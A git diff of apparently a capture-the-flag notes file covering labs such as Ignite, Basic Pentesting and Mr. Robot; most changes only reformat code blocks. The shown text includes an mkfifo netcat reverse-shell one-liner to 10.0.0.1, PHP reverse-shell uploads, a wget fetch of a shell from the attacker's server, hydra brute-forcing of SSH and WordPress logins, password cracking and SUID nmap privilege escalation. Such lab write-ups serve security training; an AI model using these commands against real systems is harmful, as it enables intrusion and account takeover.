@@ -48,11 +48,15 @@
 
 ## Ignite
 
-```nmap -sC -sV -A <IP>```
+```
+nmap -sC -sV -A <IP>
+```
 
 We found cms portal whose name is fuel lets search its exploit in kali
 
-```searchsploit fuel```
+```
+searchsploit fuel
+```
 
 Login into the site and we found its running fuel version 1.4
 
@@ -60,17 +64,23 @@ https://www.exploit-db.com/exploits/50477
 
 Download exploit and change its IP to target machine IP
 
-```python3 50477.py -u http://<Victim-IP>```
+```
+python3 50477.py -u http://<Victim-IP>
+```
 
 We got initial login with this
 
 In our main page we found that there’s a link called fuel/application/config/database.php
 
-```cat /home/www-data/flag.txt```
+```
+cat /home/www-data/flag.txt
+```
 
 Found user flag
 
-```cat fuel/application/config/database.php```
+```
+cat fuel/application/config/database.php
+```
 
 Found root user password
 
@@ -78,25 +88,37 @@ Copy pentest monkey php reverse shell and change its ip and rename it as shell.p
 
 Now run a netcat listener before
 
-```nc -lvnp 1234```
+```
+nc -lvnp 1234
+```
 
-```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f```
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+```
 
 We received reverse shell access
 
 Now we will stable our shell using pty and use bash
 
-```python3 -c 'import pty;pty.spawn("/bin/bash")'```
+```
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
 
-```cd ../../../../```
+```
+cd ../../../../
 
-```su root```
+su root
+```
 
 Enter password which is mememe
 
-```find / -name root.txt 2>/dev/null```
+```
+find / -name root.txt 2>/dev/null
+```
 
-```cat  /root/root.txt```
+```
+cat  /root/root.txt
+```
 
 We got root flag
 
@@ -104,15 +126,21 @@ We got root flag
 
 ## Basic Pentesting
 
-```nmap -sC -sV <IP>```
+```
+nmap -sC -sV <IP>
+```
 
-```gobuster dir -u http://10.49.177.197 -w dirbuster/wordlists/directory-list-2.3-medium.txt```
+```
+gobuster dir -u http://10.49.177.197 -w dirbuster/wordlists/directory-list-2.3-medium.txt
+```
 
 We found 2 files inside development folder and it talks about weak password and ssh login
 
 We also found about Apache Tomcat server running
 
-```enum4linux -a <IP>```
+```
+enum4linux -a <IP>
+```
 
 Use password as anonymous
 
@@ -126,7 +154,9 @@ We found our 2 usernames kay and jan
 
 Let us find password using hydra
 
-```hydra -l jan -P rockyou.txt 10.48.190.165 ssh```
+```
+hydra -l jan -P rockyou.txt 10.48.190.165 ssh
+```
 
 We found password
 
@@ -134,17 +164,29 @@ We found password
 
 Let us do ssh login
 
-```ssh jan@<IP>```
+```
+ssh jan@<IP>
+```
 
 Now I will transfer linpeas file to this folder using
 
-```find / -name "linpeas.sh" 2>/dev/null```
+```
+find / -name "linpeas.sh" 2>/dev/null
+```
 
-```cd <path>```
+```
+cd <path>
+```
 
-```chmod +x linpeas.sh```
+```
+chmod +x linpeas.sh
+```
 
-```scp linpeas.sh jan@<IP>:/dev/shm```  (In your machine)
+In your machine
+
+```
+scp linpeas.sh jan@<IP>:/dev/shm
+``` 
 
 Now we have linpeas inside /dev/shm in victim’s system
 
@@ -154,33 +196,46 @@ We found a whole big RSA key let us copy this to a file
 
 Copy this file into a file with name rsa_key
 
-```ssh2john rsa_key > pass.hash```
+```
+ssh2john rsa_key > pass.hash
+```
 
 First save this into a hash and then we will use ssh2john to crack it
 
-```john --wordlist=rockyou.txt pass.hash```
+```
+john --wordlist=rockyou.txt pass.hash
+```
 
-![enum result](Assets/4.png)]
+![enum result](Assets/4.png)
 
-```ssh -i /home/kay/.ssh/id_rsa kay@1<IP>```
+```
+ssh -i /home/kay/.ssh/id_rsa kay@1<IP>
+```
 
 Now we were in jan’s machine now let’s log into kay’s machine
 
 We are into kay
 
-```cat pass.bak```
+```
+cat pass.bak
+```
 
 ![enum result](Assets/5.png)
 
 
-
 ## Mr. Robot
 
-```nmap -sV -sC [Target_IP]```
+```
+nmap -sV -sC [Target_IP]
+```
 
-```gobuster dir -u http://<IP> -w <wordlist> -t 100 -q -o gobuster_output.txt```
+```
+gobuster dir -u http://<IP> -w <wordlist> -t 100 -q -o gobuster_output.txt
+```
 
-```http://<IP>/robots```
+```
+http://<IP>/robots
+```
 
 Go to web /fsocity.dic
 
@@ -188,25 +243,26 @@ download the file fsocity.dic
 
 ##### Found first flag - key-1-of-3.txt
 
-  
 
 Go to login.php and capture the packet via burp suite
 
 We will brute force login, we found invalid username issue
 
-```hydra -L file.dic -p test <IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username" -t 30```
+```
+hydra -L file.dic -p test <IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username" -t 30
+```
 
 ##### Found Username Elliot and elliot
 
-  
 
 Now lets find password
 
-```hydra -l Elliot -P Downloads/fsocity.dic 10.66.132.244 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username" -t 30```
+```
+hydra -l Elliot -P Downloads/fsocity.dic 10.66.132.244 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username" -t 30
+```
 
 ##### Found password = ER28-0652
 
-  
 
 Appearance -> Editor
 
@@ -214,11 +270,17 @@ Change ip in the file archive.php in Editor of appearance (Change IP to our PC�
 
 Now if we do nc -lvnp port
 
-```https://<IP>/wp-content/themes/twentyfifteen/archive.php```
+```
+https://<IP>/wp-content/themes/twentyfifteen/archive.php
+```
 
-```cd /home/robot```
+```
+cd /home/robot
+```
 
-```cat key-2-of-3.txt```
+```
+cat key-2-of-3.txt
+```
 
 We get reverse shell and found second flag inside robot folder but we can’t read it
 
@@ -228,7 +290,9 @@ But we can read password.raw-md5 which turns out to be a password of robots (in 
 
 Now we will dehash it (Copy hash and paste inside a file called md5.hash)
 
-```john md5.hash --wordlist=fsocity.dic --format=Raw-MD5```
+```
+john md5.hash --wordlist=fsocity.dic --format=Raw-MD5
+```
 
 password is: abcdefghijklmnopqrstuvwxyz
 
@@ -239,17 +303,23 @@ Now we can directly use it but let’s have a fully operational shell first insi
 
 pty = pseudo-terminal
 
-```python -c 'import pty;pty.spawn("bin/bash")'```
+```
+python -c 'import pty;pty.spawn("bin/bash")'
+```
 
 It spawns a fully interactive Bash shell using Python’s pseudo-terminal support.
 
 Now let’s
 
-```su robot```
+```
+su robot
+```
 
 ##### Paste password and now we can view second flag
 
-```cat key-2-of-3.txt```
+```
+cat key-2-of-3.txt
+```
 
 
 #### Privilege Escalation
@@ -258,17 +328,27 @@ Add linpeas.sh file into the victim’s system
 
 In your machine, where linpeas.sh exist run
 
-```chmod +x linpeas.sh```
+```
+chmod +x linpeas.sh
+```
 
-```python3 -m http.server 3030```
+```
+python3 -m http.server 3030
+```
 
 In victim’s machine, Navigate to /dev/shm
 
-```cd /dev/shm```
+```
+cd /dev/shm
+```
 
-```wget http://<ip>:3030/linpeas.sh```
+```
+wget http://<ip>:3030/linpeas.sh
+```
 
-```./linpeas.sh```
+```
+./linpeas.sh
+```
 
 ##### We can’t run linpeas
 
@@ -276,19 +356,27 @@ In victim’s machine, Navigate to /dev/shm
 
 For second find root user and for this we will run a command which will allow us to find any SUID binaries
 
-```find / -perm -u=s -type f 2>/dev/null```
+```
+find / -perm -u=s -type f 2>/dev/null
+```
 
 We found /user/local/bin/nmap different that ordinary files
 
-``` /usr/local/bin/map --interactive ```
+``` 
+/usr/local/bin/map --interactive 
+```
 
 Let’s go to gtfobins
 
 https://gtfobins.github.io/gtfobins/nmap/#suid
 
-```nmap --interactive```
+```
+nmap --interactive
+```
 
-```!sh```
+```
+!sh
+```
 ##### Now we are logged in as root
 
 
@@ -841,6 +929,7 @@ gobuster dir -u http://<IP> -w <wordlist>
 feroxbuster -u http://10.49.134.39 -w dirbuster/wordlists/directory-list-2.3-medium.txt
 ```
 
+Also run dirbuster where we found a page called config.php
 
 ![enum result](35.png)
 
@@ -959,7 +1048,7 @@ python -m http.server 3030
 In URL now after x= add this
 
 ```
-wget http://tun0_IP:3030/shell.php5
+wget http://tun0_IP:3030/revshell.php
 ```
 
 Now we have revshell.php file here so lets run that
@@ -1009,7 +1098,9 @@ Everything is okay in this we have to take a different path now
 
 Run nmap scans and we found smb and other things
 
-```nmap -sC -sV -vv –script=vuln <IP>```
+```
+nmap -sC -sV -vv –script=vuln <IP>
+```
 
 We found another port 49663 running our Microsoft IIS
 
